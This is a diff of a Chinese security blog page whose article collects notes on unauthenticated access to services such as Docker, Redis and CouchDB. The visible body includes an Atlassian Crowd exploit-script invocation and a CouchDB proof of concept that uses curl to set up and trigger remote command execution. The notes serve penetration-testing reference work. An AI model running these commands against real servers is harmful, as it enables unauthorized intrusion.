@@ -1,71 +1,126 @@
-
-<!DOCTYPE html>
-<html lang="zh-Hans" class="loading">
+<!doctype html>
+<html lang="zh-CN">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>未授权访问验证总结 - Sec H</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="渗透测试,"> 
-    <meta name="description" content="Docker_remote_api未授权
-docker remote  api主要的目的是取代命令行界面,
+    <meta charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
+    
+    <title>未授权访问验证总结 | Sec H</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
+    <meta name="keywords" content="Jelon, 前端, Web, 张德龙, 前端开发" >
+    <meta name="description" content="Jelon个人前端小站" >
 
-docker client和docker daemon通过unix domain soc,"> 
-    <meta name="author" content="Sec H"> 
-    <link rel="alternative" href="atom.xml" title="Sec H" type="application/atom+xml"> 
-    <link rel="icon" href="/img/gao.ico"> 
+    
+    <link rel="alternative" href="/atom.xml" title="Sec H" type="application/atom+xml" >
     
     
-<link rel="stylesheet" href="/css/diaspora.css">
+    <link rel="shortcut icon" href="/favicon.ico" >
+    
+    
+<link rel="stylesheet" href="/css/style.css?v=1610591855188.css">
 
-	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-    <script>
-         (adsbygoogle = window.adsbygoogle || []).push({
-              google_ad_client: "ca-pub-8691406134231910",
-              enable_page_level_ads: true
-         });
-    </script>
-    <script async custom-element="amp-auto-ads"
-        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
-    </script>
+    <!--[if lt IE 9]>
+    
+<script src="/js/html5.js"></script>
+
+    <![endif]-->
+    
+
 <meta name="generator" content="Hexo 5.3.0"></head>
 
-<body class="loading">
-    <span id="config-title" style="display:none">Sec H</span>
-    <div id="loader"></div>
-    <div id="single">
-    <div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://givemefivw.github.io"></a>
-    <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">未授权访问验证总结</h3>
-    <div class="social">
-        <div>
-            <div class="share">
-                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
-            </div>
-            <div id="qr"></div>
-        </div>
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a target="_blank" rel="noopener" href="http://browsehappy.com/">升级你的浏览器</a>.
     </div>
-    <div class="scrollbar"></div>
-</div>
+    <![endif]-->
 
-    <div class="section">
-        <div class="article">
-    <div class='main'>
-        <h1 class="title">未授权访问验证总结</h1>
-        <div class="stuff">
-            <span>一月 09, 2021</span>
-            
-  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
-
-
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Sec H</span>
+                    <span class="description">Welcom to My Blog :)</span>
+                </div>
+            </a>
         </div>
-        <div class="content markdown">
-            <h1 id="Docker-remote-api未授权"><a href="#Docker-remote-api未授权" class="headerlink" title="Docker_remote_api未授权"></a>Docker_remote_api未授权</h1><ul>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2021/01/09/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%90%88%E9%9B%86/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2021/01/09/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%90%88%E9%9B%86/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/2021/01/09/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%90%88%E9%9B%86/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/2021/01/09/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%90%88%E9%9B%86/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/jangdelong" target="_blank">Github</a>
+                        |
+                    
+                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
+                        
+                    
+                </p>
+                <p class="sns">
+                    
+                        <a href="http://weibo.com/jangdelong" class="sinaweibo" target="_blank"><b>■</b> 新浪微博</a>
+                    
+                        <a href="https://juejin.im/user/3984285869282919" class="qqweibo" target="_blank"><b>■</b> 掘金</a>
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>未授权访问验证总结</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Jelon 发表于
+        <time datetime="2021-01-09T11:41:29.589Z">2021-01-09</time>
+    </p>
+    <div id="JELON__articlePostContent" class="post-content">
+        <h1 id="Docker-remote-api未授权"><a href="#Docker-remote-api未授权" class="headerlink" title="Docker_remote_api未授权"></a>Docker_remote_api未授权</h1><ul>
 <li><p>docker remote  api主要的目的是取代命令行界面,</p>
 </li>
 <li><p>docker client和docker daemon通过unix domain socket进行通信.</p>
@@ -133,116 +188,162 @@ docker client和docker daemon通过unix domain soc,">
 <li>V11.X&lt;V11.5<h2 id="参考-9"><a href="#参考-9" class="headerlink" title="参考"></a>参考</h2>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/cowherd/p/13044596.html">https://www.cnblogs.com/cowherd/p/13044596.html</a><h1 id="Atlassian-Crowd-未授权"><a href="#Atlassian-Crowd-未授权" class="headerlink" title="Atlassian Crowd 未授权"></a>Atlassian Crowd 未授权</h1><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2>python CVE-2019-11580.py <a target="_blank" rel="noopener" href="http://host/">http://host</a><h1 id="CouchDB-未授权"><a href="#CouchDB-未授权" class="headerlink" title="CouchDB 未授权"></a>CouchDB 未授权</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">新增query_server配置，这里执行ifconfig命令</span><br><span class="line"></span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;&#x2F;sbin&#x2F;ifconfig &gt;&#x2F;tmp&#x2F;6666&quot;&#39;</span><br><span class="line"></span><br><span class="line">新建一个临时表，插入一条记录</span><br><span class="line"></span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line"></span><br><span class="line">调用query_server处理数据</span><br><span class="line"></span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;11&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
 </ul>
 
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
-            
-                <ul id="audio-list" style="display:none">
-                    
-                        
-                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
-                        
-                    
-                        
-                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
-                        
-                    
-                </ul>
-            
-        </div>
-        
-    <div id='gitalk-container' class="comment link"
-		data-enable='false'
-        data-ae='false'
-        data-ci=''
-        data-cs=''
-        data-r=''
-        data-o=''
-        data-a=''
-        data-d='false'
-    >查看评论</div>
-
-
     </div>
+    <p class="eof">-- EOF --</p>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            
+        </span>
+        <span class="post-tags">
+            标签：
+            
     
-        <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">Docker_remote_api未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">1.1.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">Elasticsearch 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">2.1.</span> <span class="toc-text">测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hadoop-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">Hadoop 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E8%84%9A%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">POC脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">3.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jboss%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">Jboss未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-1"><span class="toc-number">4.1.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-2"><span class="toc-number">4.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jenkins%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">jenkins未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-2"><span class="toc-number">5.1.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-3"><span class="toc-number">5.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Memcached%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">Memcached未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text">检测方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-telnet-host-11211"><span class="toc-number">6.1.1.</span> <span class="toc-text">一 telnet host 11211</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-4"><span class="toc-number">6.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MongonDB%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">MongonDB未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-3"><span class="toc-number">7.1.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-5"><span class="toc-number">7.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">Redis 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-4"><span class="toc-number">8.1.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-6"><span class="toc-number">8.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rsync-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text">Rsync 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">9.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-amp-%E5%88%A9%E7%94%A8"><span class="toc-number">9.2.</span> <span class="toc-text">验证&amp;利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-7"><span class="toc-number">9.3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VNC-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text">VNC 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-5"><span class="toc-number">10.1.</span> <span class="toc-text">验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZooKeeper-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">ZooKeeper 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-6"><span class="toc-number">11.1.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">11.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">11.3.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-8"><span class="toc-number">11.4.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E4%BC%AA%E9%80%A0%E7%99%BB"><span class="toc-number">12.</span> <span class="toc-text">通达OA前台任意用户伪造登</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8EXP%E8%84%9A%E6%9C%AC"><span class="toc-number">12.1.</span> <span class="toc-text">使用EXP脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">12.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-9"><span class="toc-number">12.3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Atlassian-Crowd-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">13.</span> <span class="toc-text">Atlassian Crowd 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">13.1.</span> <span class="toc-text">利用脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CouchDB-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">14.</span> <span class="toc-text">CouchDB 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">14.1.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>	
-        </div>
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" title="笔记">笔记</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+  <div class="article-share clearfix text-center">
+    <div class="share-area">
+      <span class="share-txt">分享到：</span>
+      <a href="javascript: window.open('http://service.weibo.com/share/share.php?url=' + encodeURIComponent(location.href) + '&title=' + document.title + '&language=zh_cn');" class="share-icon weibo"></a>
+      <a href="javascript: alert('请复制链接到微信并发送');" class="share-icon wechat"></a>
+      <a href="javascript: window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(location.href) + '&title=' + document.title);" class="share-icon qqzone"></a>
+      <a href="javascript: window.open('http://connect.qq.com/widget/shareqq/index.html?url=' + encodeURIComponent(location.href) + '&desc=Jelon个人博客&title=' + document.title + '&callback=' + encodeURIComponent(location.href));" class="share-icon qq"></a>
+      <a href="javascript: window.open('http://shuo.douban.com/!service/share?href=' + encodeURIComponent(location.href) + '&name=' + document.title + '&text=' + document.title);" class="share-icon douban"></a>
+    </div>
+  </div>
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br >
+        <a href="/2021/01/12/CVE-2021-3019-Lanproxy-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/">
+            
+                CVE-2021-3019 Lanproxy 路径遍历漏洞
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br >
+        <a href="/2021/01/07/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9EPOC/">
+            
+                CVE-2020-17519 Apache Flink 任意文件读取漏洞
+            
+        </a>
+    </span>
     
 </div>
 
+<!-- 文章评论 -->
 
-    </div>
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
+        <div class="search-form">
+  <form
+    id="searchForm"
+    method="GET"
+    action="https://www.baidu.com/s"
+    ectype="application/x-www-form-urlencoded"
+    target="_blank"
+    autocomplete="false"
+    onsubmit="javascript: return false;">
+    <input
+      id="searchKeyword"
+      type="text"
+      class="form-control"
+      placeholder="输入关键字搜索"
+      autocomplete="false"
+    />
+    <input id="searchKeywordHidden" type="hidden" name="wd" />
+    <input id="searchButton" class="btn" type="submit" value="搜索" />
+  </form>
 </div>
+    </section>
+    
+
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (4)</a>
+  
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (7)</a>
+  
+    <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (5)</a>
+  
+    <a class="tag-item" href="/tags/%E7%AC%94%E8%AE%B0/" title="笔记">笔记 (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://github.com/front-end-pigs/blog" target="_blank" title="Github博客">Github博客</a>
+        </li>
+    
+        <li>
+            <a href="https://jelon.info" target="_blank" title="Jelon博客">Jelon博客</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2021
+    
+
+    <a href="/">Jelon Loves You</a>
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+
+<script src="/js/main.js?v=1610591855190.js"></script>
+
+
 </body>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-
-
 </html>
